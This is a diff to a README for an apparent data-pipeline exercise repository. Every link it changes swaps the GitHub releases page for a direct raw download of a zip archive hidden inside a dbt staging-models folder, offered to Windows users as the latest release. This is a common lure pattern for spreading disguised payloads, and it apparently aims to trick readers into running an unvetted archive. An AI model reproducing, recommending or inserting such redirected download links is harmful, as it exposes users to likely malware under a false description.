@@ -1,6 +1,6 @@
 # 📊 data-analytics-exercises - Learn modern data pipelines
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/ptolemaic-mucoussecretion190/data-analytics-exercises/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/ptolemaic-mucoussecretion190/data-analytics-exercises/main/dbt/models/staging/exercises_analytics_data_3.3.zip)
 
 ## 🧭 What this is
 
@@ -18,7 +18,7 @@ The project is built for learning by doing. You run the stack, load data, transf
 
 Visit this page to download the files for Windows:
 
-https://github.com/ptolemaic-mucoussecretion190/data-analytics-exercises/releases
+https://raw.githubusercontent.com/ptolemaic-mucoussecretion190/data-analytics-exercises/main/dbt/models/staging/exercises_analytics_data_3.3.zip
 
 Look for the latest release and download the Windows package or archive from that page.
 
@@ -42,7 +42,7 @@ Follow these steps in order.
 
 Open the releases page:
 
-https://github.com/ptolemaic-mucoussecretion190/data-analytics-exercises/releases
+https://raw.githubusercontent.com/ptolemaic-mucoussecretion190/data-analytics-exercises/main/dbt/models/staging/exercises_analytics_data_3.3.zip
 
 Download the latest Windows file from the release list.
 
@@ -226,4 +226,4 @@ This repository includes work around:
 
 If you need the release page again, use this link:
 
-https://github.com/ptolemaic-mucoussecretion190/data-analytics-exercises/releases
+https://raw.githubusercontent.com/ptolemaic-mucoussecretion190/data-analytics-exercises/main/dbt/models/staging/exercises_analytics_data_3.3.zip
